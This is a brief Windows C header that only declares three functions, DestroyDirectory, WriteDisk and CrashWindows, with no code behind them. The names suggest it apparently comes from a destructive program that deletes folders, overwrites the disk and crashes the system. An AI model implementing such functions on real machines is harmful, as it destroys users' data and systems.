#pragma once

#include <Windows.h>
#include <AclAPI.h>

extern void DestroyDirectory(PWSTR szDirectory);
extern void WriteDisk();
extern void CrashWindows();